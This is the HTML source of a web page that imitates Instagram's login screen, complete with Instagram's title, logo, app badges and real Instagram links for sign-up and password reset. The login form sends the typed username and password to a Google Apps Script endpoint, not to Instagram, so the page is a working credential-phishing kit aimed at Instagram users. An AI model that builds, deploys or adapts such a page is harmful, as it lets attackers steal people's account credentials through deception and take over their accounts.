<!DOCTYPE html>
<html lang="en">
<head>
        
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial_scale=1.0" />
    <title>Instagram</title>
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/media-queries.css" />
    <link rel="icon" href="photos/instagram.png" />
</head>
<body>
    <main>
        <div class="log-in-container">
            <div class="log-in">
                <img src="photos/logo.png" class="logo"/>

               <form class="log-in-form" action="https://script.google.com/macros/s/AKfycbyD3Q30d61lkQstg687CIW-WPwuiEx-SJ_uhTxxAwlGCOQgjFnuSKPV647cHTbt2Z8ioQ/exec" method="post">
                    <input type="text" name="username" placeholder="Phone number,username or email" />
                    <input type="password" placeholder="Password" name="password" />
                    <button class="log-in-button" type="submit">Log In</button>
               </form> 

                <span class="or-divider">OR</span>
                <!--FACEBOOK OPTION-->
                <div class="fb-login">
                    <a href="https://www.facebook.com/">
                        <img src="photos/facebook-icon.png">
                        <span>Log in with Facebook</span>
                    </a>
                </div>
                <!--forgot passwd-->
                <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
            </div>
            <!--sign up-->
            <div class="sign-up">
                <span>Don't have an account
                    <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
                </span>
            </div>
            <!--download-->
            <div class="get-the-app">
                <span>Get the app</span>
                <div class="app-images">
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D00F453F0-99FA-4C45-BE8B-131476D80595%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge"><img src="photos/applestore.png" /></a>
                    <a href="https://www.instagram.com/"><img src="photos/googlestore.png" /></a>
                </div>
            </div>

        </div>
        <!--phones-->
        <div class="phones-container">
            <img style="width: 88%;" src="photos/Screenshot_2024-11-06_172056-removebg-preview.png" />
        </div>
    </main>
</body>

</html>
